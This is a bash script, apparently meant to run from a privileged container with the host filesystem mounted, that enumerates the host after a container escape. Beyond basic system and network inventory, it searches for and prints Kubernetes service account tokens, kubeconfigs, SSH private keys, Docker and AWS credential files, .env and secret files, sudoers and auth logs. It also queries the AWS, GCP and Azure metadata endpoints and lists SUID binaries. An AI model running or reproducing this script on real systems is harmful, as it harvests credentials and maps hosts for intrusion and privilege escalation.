#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10 || echo "  Cannot read OS info"
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null || echo "  Cannot get kernel info"
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null || echo "  Cannot get hostname"
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null || echo "  Cannot get uptime"
echo ""

echo "=== 2. HARDWARE INFORMATION ==="
echo "[*] CPU Info:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5 || echo "  Cannot read CPU info"
echo ""

echo "[*] Memory Info:"
chroot /host cat /proc/meminfo 2>/dev/null | head -5 || echo "  Cannot read memory info"
echo ""

echo "=== 3. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null || chroot /host ifconfig 2>/dev/null || cat /host/proc/net/dev | head -10
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null || cat /host/proc/net/route | head -10
echo ""

echo "[*] ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "=== 4. USERS AND GROUPS ==="
echo "[*] Users (/etc/passwd):"
chroot /host cat /etc/passwd 2>/dev/null | head -20
echo ""

echo "[*] Groups (/etc/group):"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  Cannot read sudoers"
echo ""

echo "=== 5. RUNNING PROCESSES ==="
echo "[*] Process List (top 20 by PID):"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/stat 2>/dev/null | head -5
echo ""

echo "=== 6. INSTALLED SOFTWARE ==="
echo "[*] Installed Packages (if Debian/Ubuntu):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  Not Debian-based or cannot access"
echo ""

echo "[*] Installed Packages (if RHEL/CentOS):"
chroot /host rpm -qa 2>/dev/null | head -20 || echo "  Not RHEL-based or cannot access"
echo ""

echo "=== 7. DOCKER/KUBERNETES COMPONENTS ==="
echo "[*] Docker Socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || ls -la /host/run/docker.sock 2>/dev/null || echo "  Docker socket not found"
echo ""

echo "[*] Containerd Socket:"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || ls -la /host/run/containerd/containerd.sock 2>/dev/null || echo "  Containerd socket not found"
echo ""

echo "[*] Kubernetes Components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet directory not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Service Account Tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10
echo ""

echo "[*] Kubeconfig Files:"
find /host -path "*/.kube/config" -o -name "kubeconfig" 2>/dev/null | head -10
echo ""

echo "=== 8. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH Keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root SSH directory"
find /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "[*] Docker Credentials:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] AWS Credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
cat /host/root/.aws/credentials 2>/dev/null | head -10 || echo "  No AWS credentials found"
echo ""

echo "[*] Environment Files with Secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
find /host -name "*secret*" -type f 2>/dev/null | grep -v "/proc\|/sys" | head -10
echo ""

echo "=== 9. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  No system crontab"
chroot /host crontab -l 2>/dev/null || echo "  No root crontab"
echo ""

echo "[*] Systemd Timers:"
chroot /host systemctl list-timers 2>/dev/null | head -10 || echo "  Cannot list timers"
echo ""

echo "=== 10. FILE SYSTEM ==="
echo "[*] Mounted Filesystems:"
chroot /host df -h 2>/dev/null | head -15 || cat /host/proc/mounts | head -15
echo ""

echo "[*] Disk Usage:"
chroot /host du -sh /host/* 2>/dev/null | sort -h | tail -10 || echo "  Cannot get disk usage"
echo ""

echo "[*] Writable Directories:"
find /host/tmp -writable -type d 2>/dev/null | head -5
find /host/var/tmp -writable -type d 2>/dev/null | head -5
echo ""

echo "=== 11. CLOUD PROVIDER METADATA ==="
echo "[*] AWS Metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP Metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure Metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=== 12. SECURITY CONFIGURATION ==="
echo "[*] SUID Binaries:"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] SGID Binaries:"
find /host -perm -2000 -type f 2>/dev/null | head -20
echo ""

echo "[*] World-writable Files:"
find /host -perm -002 -type f 2>/dev/null | grep -v "/proc\|/sys" | head -20
echo ""

echo "=== 13. LOG FILES ==="
echo "[*] Recent Auth Logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  Cannot read auth logs"
echo ""

echo "[*] Recent System Logs:"
chroot /host journalctl -n 20 2>/dev/null | head -20 || echo "  Cannot read system logs"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
